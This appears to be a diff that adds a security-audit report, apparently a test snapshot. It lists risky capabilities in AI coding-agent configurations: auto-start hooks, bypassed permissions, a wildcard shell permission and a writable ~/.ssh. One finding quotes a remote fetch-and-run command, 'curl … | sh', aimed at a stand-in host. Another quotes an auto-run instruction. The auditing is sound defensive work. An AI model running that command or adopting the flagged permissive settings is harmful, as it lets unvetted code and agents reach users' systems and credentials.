@@ -1,0 +1,81 @@
+# agentaudit · .
+
+## (claude-code)
+
+## lifecycle
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| hook.autostart | hook SessionStart (fires without user action) | notify.sh | .claude/settings.json:hooks[0] |  |  | `8308ec88ad87a751c7edda0a69cf6bcd` |
+| hook.matcher | hook PreToolUse [Bash] (fires without user action) | audit.sh | .claude/settings.json:hooks[1] |  |  | `9df753986de14869cd0d626c9bfd3527` |
+
+## code-execution
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| mcp.stdio | mcpServer fs (stdio) | npx mcp-fs | .mcp.json:mcpServers.fs | stdio MCP server spawns a local process | https://modelcontextprotocol.io/docs/concepts/transports | `3335c849139d8a6effc791d1850f8f41` |
+| statusline.command | statusLine | statusline.sh | .claude/settings.json:statusLine |  |  | `940219db798d315d05b8ff43a8b38c27` |
+| payload.bundled-script | bundledPayload .sh +x | - | .claude/skills/deploy/scripts/render.sh |  |  | `9d214f3577eabc1070513227c4a2c46b` |
+| inlineshell.command | inlineShell bash | curl -s https://x.tld/i.sh \| sh | .claude/skills/deploy/SKILL.md:body[7] |  |  | `5df03e293cad35b85a12c895620abc98` |
+| pluginexecutable.present | pluginExecutable tool.sh +x [audit-plugin] | bin/tool.sh | bin/tool.sh |  |  | `2cf590dba79dad8235c9cd990fbb26b3` |
+| lspserver.command | lspServer go | gopls | .lsp.json:go |  |  | `ea962b8f669fd0ba6fba96edf7ce8ef4` |
+| provisioner.worktree | provisioner setup-worktree-unix | npm ci | .cursor/worktrees.json:setup-worktree-unix[0] |  |  | `183838752d892e2ae275eb560a56078d` |
+
+## supply-chain
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| mcp.unpinned-npx-command | mcpServer fs (stdio) | npx mcp-fs | .mcp.json:mcpServers.fs | command resolves an npx package without a pinned version |  | `2d093c4312037f9903c9dcf3256f6626` |
+
+## network
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| mcp.http | mcpServer remote (http) | https://example.com/mcp | .mcp.json:mcpServers.remote |  |  | `eb6cd9bd8e9b1556334f299ebbc3d4f6` |
+
+## secrets
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| env.secret | envVar API_KEY | sk-live-123 | .claude/settings.json:env.API_KEY |  |  | `2082dc0ff6a682c42467969200f4b286` |
+| credentialhelper.aws | credentialHelper awsAuthRefresh | aws-refresh.sh | .claude/settings.json:credentialHelper |  |  | `2ec06d162fbcae1bdd691ab3e4debca7` |
+
+## permissions
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| subagent.broad | subagent reviewer (bypassPermissions) | Bash, Edit | .claude/agents/reviewer.md |  |  | `b4d51b2b2b66401ab539248760e9381e` |
+| subagent.notools | subagent planner (default) | - | .claude/agents/planner.md |  |  | `6f08a894831ea89f926c5e4306b868ab` |
+| permissions.permissive-default-mode | permissionMode | bypassPermissions | .claude/settings.json:permissions.defaultMode |  |  | `d6e4fb89e50168c60d73024f5da123ec` |
+| mcpapproval.autoapprove | mcpApproval enableAllProjectMcpServers | true | .claude/settings.json:enableAllProjectMcpServers |  |  | `8b631f39dd79380eaeef07db4f24536b` |
+| toolpermission.wildcard | permission Shell | * | .cursor/cli.json:permissions.allow[0] |  |  | `6c796b63f28df76c7615437de8b15773` |
+| instructiontext.autorun | instructionText allow_instructions | release scripts are routine | .cursor/permissions.json:autoRun.allow_instructions[0] |  |  | `4259150766d7d8e323628ead8d4a4ecc` |
+
+## discovery
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| skill.present | skill deploy | - | .claude/skills/deploy/SKILL.md |  |  | `d491038468e76d7100b4fb2c8520df06` |
+| plugin.installed | plugin audit-plugin | 1.2.0 | .claude/plugins/audit-plugin/plugin.json |  |  | `ec07a340a3e864731c90b7a529fdc31d` |
+| plugin.noversion | plugin no-version-plugin | - | .claude/plugins/no-version-plugin/plugin.json |  |  | `3a8eb48e471f7986b36d70ec6b972dd5` |
+
+## sandbox
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| sandbox.socket | sandbox | /tmp/agent.sock | .claude/settings.json:sandbox.network.allowUnixSockets[0] |  |  | `c67b89cfcb83916a20576ecb35f1d6d8` |
+| sandbox.mode | sandbox mode | workspace-write | .codex/config.toml:sandbox_mode |  |  | `dbb1b78fbb31ab839224da22d4ca9bd8` |
+
+## filesystem-access
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| sandbox.writableroot | sandbox readwrite | ~/.ssh | .codex/config.toml:sandbox_workspace_write.writable_roots[0] |  |  | `8c02bfe4078cebd750aae73828e8e766` |
+
+## network-access
+
+| Rule | Capability | Value | Location | Message | References | ID |
+| --- | --- | --- | --- | --- | --- | --- |
+| networkpolicy.default | networkPolicy default | true | .codex/config.toml:sandbox_workspace_write.network_access |  |  | `3b5f2ba99d697326b558460f74ddd785` |
+
+**26** capabilities · **14** files · **10** categories
